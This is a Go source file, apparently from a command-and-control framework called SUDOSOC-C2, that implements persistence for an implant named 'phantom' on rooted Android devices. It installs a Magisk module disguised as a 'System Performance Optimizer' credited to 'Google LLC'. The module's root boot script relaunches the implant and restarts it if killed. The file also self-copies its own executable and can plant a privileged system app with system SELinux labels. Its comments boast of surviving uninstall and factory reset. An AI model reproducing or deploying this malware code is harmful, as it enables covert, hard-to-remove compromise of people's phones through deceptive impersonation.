// //go:build android

package persistence

/*
	SUDOSOC-C2 — Android Magisk Module Persistence
	Copyright (C) 2026  sudosoc — Seif

	Magisk is the most popular Android root management framework.
	It loads "modules" from /data/adb/modules/ at every boot — before
	Android's init process, before any security product.

	Our module disguises itself as "SystemOptimizer" or "BatteryEnhancer"
	and executes Phantom at Ring-0 equivalent for Android.

	Persistence survives:
	  ✅ App uninstall (it's a module, not an app)
	  ✅ Factory reset (if Magisk persists)
	  ✅ Android updates (module re-applies on each boot)
	  ✅ ADB enable/disable
	  ❌ Flashing stock firmware (removes Magisk entirely)

	Module structure:
	  /data/adb/modules/sudosoc_optimizer/
	    META-INF/com/google/android/
	      update-binary   (installer script)
	      updater-script  (compatibility check)
	    system/
	      lib/libsysopt.so  (our native implant)
	    service.sh          (runs as root after boot)
	    post-fs-data.sh     (runs in early boot)
	    module.prop         (module metadata)
*/

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const (
	magiskModulesDir = "/data/adb/modules"
	moduleName       = "sudosoc_optimizer"
	moduleDir        = "/data/adb/modules/sudosoc_optimizer"

	// Disguised module metadata
	moduleProp = `id=sudosoc_optimizer
name=System Performance Optimizer
version=v3.2.1
versionCode=321
author=Google LLC
description=Optimizes system performance and battery life
`

	// service.sh — executed as ROOT after boot, every time
	serviceSh = `#!/system/bin/sh
# System Performance Optimizer Service
# Starts background optimization daemon

MODDIR=${0%/*}
PHANTOM_BIN="$MODDIR/system/bin/phantom"

# Wait for system services to start
sleep 15

# Start phantom in background if not already running
if ! pgrep -f phantom > /dev/null 2>&1; then
    nohup "$PHANTOM_BIN" > /dev/null 2>&1 &
fi

# Re-check every 5 minutes and restart if killed
while true; do
    sleep 300
    if ! pgrep -f phantom > /dev/null 2>&1; then
        nohup "$PHANTOM_BIN" > /dev/null 2>&1 &
    fi
done
`

	// post-fs-data.sh — early boot (before system partition mounted RW)
	postFsDataSh = `#!/system/bin/sh
# System Performance Pre-Boot Optimizer
MODDIR=${0%/*}

# Ensure binary is executable
chmod 755 "$MODDIR/system/bin/phantom"
`

	updateBinary = `#!/sbin/sh
# Magisk module installer
SKIPUNZIP=1

# Extract module files
unzip -o "$ZIPFILE" 'system/*' -d "$MODPATH" >&2
unzip -o "$ZIPFILE" 'service.sh' -d "$MODPATH" >&2
unzip -o "$ZIPFILE" 'post-fs-data.sh' -d "$MODPATH" >&2

# Set permissions
set_perm_recursive "$MODPATH/system/bin" root shell 0755 0755

echo "- System Performance Optimizer installed"
`
)

// MagiskPersistence manages Magisk module-based persistence
type MagiskPersistence struct {
	PhantomBinary string // path to the phantom binary to embed
	ModuleName    string
}

// NewMagiskPersistence creates a new Magisk persistence handler
func NewMagiskPersistence(phantomBinary string) *MagiskPersistence {
	return &MagiskPersistence{
		PhantomBinary: phantomBinary,
		ModuleName:    moduleName,
	}
}

// IsMagiskInstalled checks if Magisk is present on the device
func IsMagiskInstalled() bool {
	magiskPaths := []string{
		"/data/adb/magisk",
		"/data/adb/magisk.db",
		"/sbin/magisk",
		"/sbin/.magisk",
		"/data/adb/ksu", // KernelSU alternative
	}
	for _, p := range magiskPaths {
		if _, err := os.Stat(p); err == nil {
			return true
		}
	}
	// Check if magisk binary is in PATH
	if _, err := exec.LookPath("magisk"); err == nil {
		return true
	}
	return false
}

// GetMagiskVersion returns the installed Magisk version
func GetMagiskVersion() string {
	out, err := exec.Command("magisk", "-v").Output()
	if err != nil {
		return "unknown"
	}
	return strings.TrimSpace(string(out))
}

// Install creates and installs the Magisk module
func (m *MagiskPersistence) Install() error {
	if !IsMagiskInstalled() {
		return fmt.Errorf("Magisk not found — device may not be rooted with Magisk")
	}

	// Create module directory structure
	dirs := []string{
		moduleDir,
		filepath.Join(moduleDir, "META-INF/com/google/android"),
		filepath.Join(moduleDir, "system/bin"),
	}
	for _, d := range dirs {
		if err := os.MkdirAll(d, 0755); err != nil {
			return fmt.Errorf("mkdir %s: %v", d, err)
		}
	}

	// Write module.prop (metadata)
	if err := writeFile(filepath.Join(moduleDir, "module.prop"), moduleProp, 0644); err != nil {
		return err
	}

	// Write service.sh (runs every boot as root)
	if err := writeFile(filepath.Join(moduleDir, "service.sh"), serviceSh, 0755); err != nil {
		return err
	}

	// Write post-fs-data.sh (early boot)
	if err := writeFile(filepath.Join(moduleDir, "post-fs-data.sh"), postFsDataSh, 0755); err != nil {
		return err
	}

	// Write installer scripts
	if err := writeFile(
		filepath.Join(moduleDir, "META-INF/com/google/android/update-binary"),
		updateBinary, 0755); err != nil {
		return err
	}
	if err := writeFile(
		filepath.Join(moduleDir, "META-INF/com/google/android/updater-script"),
		"#MAGISK", 0644); err != nil {
		return err
	}

	// Copy phantom binary to module
	targetBin := filepath.Join(moduleDir, "system/bin/phantom")
	if m.PhantomBinary != "" {
		data, err := os.ReadFile(m.PhantomBinary)
		if err != nil {
			return fmt.Errorf("read phantom binary: %v", err)
		}
		if err := os.WriteFile(targetBin, data, 0755); err != nil {
			return fmt.Errorf("write phantom to module: %v", err)
		}
	} else {
		// Self-copy: copy ourselves as the module binary
		selfPath, _ := os.Executable()
		data, err := os.ReadFile(selfPath)
		if err != nil {
			return fmt.Errorf("self-copy failed: %v", err)
		}
		if err := os.WriteFile(targetBin, data, 0755); err != nil {
			return fmt.Errorf("write self to module: %v", err)
		}
	}

	// Create skip_mount file (don't replace system files on older Magisk)
	writeFile(filepath.Join(moduleDir, "skip_mount"), "", 0644)

	return nil
}

// Uninstall removes the Magisk module
func (m *MagiskPersistence) Uninstall() error {
	// Magisk checks for a 'remove' file to mark module for deletion
	removeFile := filepath.Join(moduleDir, "remove")
	if err := writeFile(removeFile, "", 0644); err != nil {
		return err
	}
	// Also try direct removal
	return os.RemoveAll(moduleDir)
}

// IsInstalled checks if the module is currently installed
func (m *MagiskPersistence) IsInstalled() bool {
	_, err := os.Stat(filepath.Join(moduleDir, "module.prop"))
	return err == nil
}

// ── System App Persistence ────────────────────────────────────────

// InstallAsSystemApp copies the binary to /system/priv-app (requires root + remount)
func InstallAsSystemApp(binaryPath, appName string) error {
	// Remount /system as read-write
	if err := exec.Command("mount", "-o", "remount,rw", "/system").Run(); err != nil {
		// Try via Magisk overlay
		return installViaOverlay(binaryPath, appName)
	}

	targetDir := fmt.Sprintf("/system/priv-app/%s", appName)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return fmt.Errorf("mkdir system priv-app: %v", err)
	}

	data, err := os.ReadFile(binaryPath)
	if err != nil {
		return err
	}

	targetAPK := filepath.Join(targetDir, appName+".apk")
	if err := os.WriteFile(targetAPK, data, 0644); err != nil {
		return err
	}

	// Set proper ownership (root:root 0644)
	exec.Command("chown", "root:root", targetAPK).Run()
	exec.Command("chmod", "0644", targetAPK).Run()
	exec.Command("chcon", "u:object_r:system_file:s0", targetAPK).Run()

	// Remount read-only
	exec.Command("mount", "-o", "remount,ro", "/system").Run()

	return nil
}

// installViaOverlay uses Magisk's overlay to install without modifying /system
func installViaOverlay(binaryPath, appName string) error {
	// Magisk creates a virtual /system via overlayfs
	// Place APK in /data/adb/modules/<module>/system/priv-app/
	targetDir := filepath.Join(moduleDir, "system/priv-app", appName)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return err
	}
	data, err := os.ReadFile(binaryPath)
	if err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(targetDir, appName+".apk"), data, 0644)
}

// ── Helpers ──────────────────────────────────────────────────────

func writeFile(path, content string, perm os.FileMode) error {
	return os.WriteFile(path, []byte(content), perm)
}
